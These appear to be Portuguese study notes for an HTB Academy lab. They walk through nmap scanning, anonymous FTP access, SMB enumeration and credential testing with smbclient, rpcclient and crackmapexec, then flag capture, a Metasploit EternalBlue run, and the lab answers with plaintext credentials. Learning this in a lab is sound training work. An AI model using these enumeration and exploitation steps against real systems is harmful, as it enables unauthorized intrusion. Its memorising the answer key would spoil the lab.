#######################################################################
# HTB ACADEMY - GETTING STARTED
# SERVICE SCANNING + ENUMERATION + SMB + FTP + PUBLIC EXPLOITS
#
# OBJETIVO:
# Descobrir serviços
# Identificar versões
# Enumerar recursos
# Encontrar credenciais
# Acessar compartilhamentos
# Obter flag
#######################################################################

#######################################################################
# ETAPA 1 - DESCOBERTA DE PORTAS
#######################################################################

# Scan básico (1000 portas mais comuns)
nmap 10.129.40.95

# Scan de todas as portas TCP
nmap -p- 10.129.40.95

# Scan com scripts NSE padrão
nmap -sC 10.129.40.95

# Scan de versões
nmap -sV 10.129.40.95

# Scan completo recomendado
nmap -sC -sV -p- 10.129.40.95

#######################################################################
# RESULTADO OBTIDO
#######################################################################

# 21/tcp   FTP       vsFTPd 3.0.3
# 22/tcp   SSH       OpenSSH 8.2p1
# 80/tcp   HTTP      Apache 2.4.41
# 139/tcp  SMB
# 445/tcp  SMB
# 2323/tcp TELNET    Linux telnetd
# 8080/tcp HTTP      Apache Tomcat

#######################################################################
# QUESTÃO 1
#######################################################################

# Descobrir serviço na porta 8080

nmap -sV -p 8080 10.129.40.95

# Resposta:
# Apache Tomcat

#######################################################################
# QUESTÃO 2
#######################################################################

# Descobrir porta não padrão do Telnet

nmap -sV -p- 10.129.40.95

# Resposta:
# 2323

#######################################################################
# ETAPA 2 - BANNER GRABBING
#######################################################################

# Banner grabbing com Netcat

nc -nv 10.129.40.95 21

# Banner grabbing com Nmap

nmap -sV --script=banner 10.129.40.95

#######################################################################
# ETAPA 3 - ENUMERAÇÃO FTP
#######################################################################

# Conectar ao FTP

ftp 10.129.40.95

# Login anônimo

anonymous
anonymous

# Listar diretórios

ls

# Entrar na pasta pub

cd pub

# Listar conteúdo

ls

# Baixar arquivo contendo credenciais

get login.txt

# Sair do FTP

exit

#######################################################################
# ETAPA 4 - ANALISAR ARQUIVO BAIXADO
#######################################################################

cat login.txt

# Credencial encontrada

# admin:ftp@dmin123

#######################################################################
# ETAPA 5 - ENUMERAÇÃO SMB
#######################################################################

# Listar shares sem autenticação

smbclient -N -L \\\\10.129.40.95

# Resultado

# print$
# users
# IPC$

#######################################################################
# ETAPA 6 - TENTATIVA DE ACESSO COM ADMIN
#######################################################################

# Conectar ao share users

smbclient -U admin \\\\10.129.40.95\\users

# Senha

ftp@dmin123

# Resultado

# Login válido
# Permissão negada para listar diretório

#######################################################################
# ETAPA 7 - ENUMERAÇÃO DE PERMISSÕES SMB
#######################################################################

# Enumerar shares e permissões

smbmap -H 10.129.40.95 -u admin -p 'ftp@dmin123'

# Enumerar via RPC

rpcclient -U admin%ftp@dmin123 10.129.40.95

# Enumerar usuários

enumdomusers

# Informações detalhadas

querydispinfo

# Enumerar shares

netshareenum

#######################################################################
# ETAPA 8 - ENUMERAÇÃO AUTOMATIZADA
#######################################################################

# Enumeração SMB automática

enum4linux 10.129.40.95

# Versão nova

enum4linux-ng 10.129.40.95

#######################################################################
# ETAPA 9 - CRACKMAPEXEC
#######################################################################

# Testar credenciais

crackmapexec smb 10.129.40.95 -u admin -p 'ftp@dmin123'

# Enumerar shares

crackmapexec smb 10.129.40.95 -u admin -p 'ftp@dmin123' --shares

#######################################################################
# ETAPA 10 - DESCOBERTA DO USUÁRIO CORRETO
#######################################################################

# A própria aula indicava:
# usuário = bob
# senha = Welcome1

smbclient -U bob \\\\10.129.40.95\\users

# Senha

Welcome1

#######################################################################
# ETAPA 11 - ENUMERAÇÃO INTERNA DO SHARE
#######################################################################

# Listar diretórios

ls

# Resultado

# flag
# bob

#######################################################################
# ETAPA 12 - CAPTURA DA FLAG
#######################################################################

# Entrar na pasta flag

cd flag

# Listar conteúdo

ls

# Baixar flag

get flag.txt

# Sair

exit

# Ler flag

cat flag.txt

#######################################################################
# SEARCHSPLOIT
#######################################################################

# Pesquisar vulnerabilidades

searchsploit openssh

# Pesquisar versão específica

searchsploit openssh 8.2

# Copiar exploit

searchsploit -m ID

#######################################################################
# METASPLOIT
#######################################################################

# Abrir Metasploit

msfconsole

# Pesquisar exploit

search exploit eternalblue

# Selecionar exploit

use exploit/windows/smb/ms17_010_psexec

# Ver opções

show options

# Definir alvo

set RHOSTS 10.10.10.40

# Definir IP do atacante

set LHOST tun0

# Verificar vulnerabilidade

check

# Executar exploit

run

# Ou

exploit

#######################################################################
# FLUXO MENTAL DO PENTESTER
#######################################################################

# Descobrir portas
# ↓
# Identificar serviços
# ↓
# Identificar versões
# ↓
# Enumerar FTP
# ↓
# Encontrar credenciais
# ↓
# Enumerar SMB
# ↓
# Encontrar usuários
# ↓
# Acessar compartilhamentos
# ↓
# Encontrar arquivos sensíveis
# ↓
# Capturar flag
# ↓
# Procurar exploits públicos
# ↓
# Explorar vulnerabilidades
# ↓
# Obter shell
# ↓
# Escalar privilégios
# ↓
# Concluir objetivo

#######################################################################
# RESPOSTAS FINAIS
#######################################################################

# Questão 1
# Apache Tomcat

# Questão 2
# 2323

# Questão 3
# smbclient -U bob \\\\10.129.40.95\\users
# senha: Welcome1
# cd flag
# get flag.txt
# cat flag.txt

#######################################################################
# COMANDOS QUE VOCÊ REALMENTE EXECUTOU
#######################################################################

nmap -sC -sV -p- 10.129.40.95

ftp 10.129.40.95

ls

cd pub

get login.txt

exit

cat login.txt

smbclient -N -L \\\\10.129.40.95

smbclient \\\\10.129.40.95\\users -N

smbclient -U admin \\\\10.129.40.95\\users

smbmap -H 10.129.40.95 -u admin -p 'ftp@dmin123'

rpcclient -U admin%ftp@dmin123 10.129.40.95

smbclient -U bob \\\\10.129.40.95\\users

ls

cd flag

ls

get flag.txt

cat flag.txt